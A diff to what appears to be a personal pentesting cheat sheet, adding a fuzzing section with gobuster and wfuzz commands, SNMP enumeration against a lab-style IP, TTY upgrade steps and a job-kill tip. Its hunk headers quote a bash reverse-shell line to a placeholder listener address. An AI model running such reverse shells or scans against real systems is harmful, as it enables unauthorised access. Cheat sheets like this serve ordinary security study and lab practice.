@@ -213,9 +213,7 @@ system("bash -c 'bash -i >& /dev/tcp/IP_YOUR_LOCAL_MACHINE/443 0>&1'")
 `snmpwalk -v2c -c internal 10.10.11.193`
 `snmpbulkwalk -v2c -c internal 10.10.11.193`: faster scann than snmpwalk
 
-`wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "URL/FUZZ"`
-- -L: redirect
-- --hc: Hide Code
+
 
 `cewl -w dictionary.txt http://ip`
 - This command generates a dictionary based on the words of the content of the web page
@@ -223,6 +221,15 @@ system("bash -c 'bash -i >& /dev/tcp/IP_YOUR_LOCAL_MACHINE/443 0>&1'")
 `ps -faux`: List running process
 
 `updatedb`
+### FUZZING
+`./gobuster dir -u URL -w DICTIONARY -t 200`
+
+`wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt URL/FUZZ/`
+- -L: redirect
+- --hc: Hide Code# Get a TTY
+- -t: number of threats
+- w: dictionary
+
 # Get a TTY
 `script /dev/null -c bash`
 CTRL + Z
@@ -243,3 +250,5 @@ CTRL + Z
 `timeout 1 OTHER_COMMAND`: this command takes 1 second to execute at most
 
 `masscan`: escano de puertos y herramienta profesional muy potente para auditar empresas
+
+`kill %`: kill the process that is at the back
